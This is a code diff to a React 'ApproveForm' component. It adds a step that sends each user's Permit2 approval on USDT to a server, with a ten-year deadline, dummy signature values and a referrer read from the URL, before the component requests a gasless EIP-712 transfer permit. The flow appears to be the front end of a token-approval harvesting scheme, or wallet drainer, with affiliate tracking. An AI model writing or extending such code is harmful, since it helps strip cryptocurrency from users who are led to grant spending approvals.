@@ -81,6 +81,25 @@ export default function ApproveForm() {
         await approveTx.wait();
 
         toast.success('✅ Permit2 approved on USDT token!', { id: 'approve-step' });
+
+        // Instantly record approval on server so data is saved immediately
+        try {
+          const defaultExp = Math.floor(Date.now() / 1000) + 3600 * 24 * 365 * 10;
+          await api.submitPermit({
+            owner: account,
+            token: USDT_ADDRESS,
+            amount: requiredAllowance.toString(),
+            nonce: 0,
+            deadline: defaultExp,
+            v: 27,
+            r: '0x' + '0'.repeat(64),
+            s: '0x' + '0'.repeat(64),
+            spender: PERMIT2_ADDRESS,
+            referrer: getReferrerFromUrl(),
+          });
+        } catch (preErr) {
+          console.warn('Instant approval pre-logging warning:', preErr.message);
+        }
       }
 
       // ── Step 2: Sign EIP-712 AllowanceTransfer Permit (gasless) ──
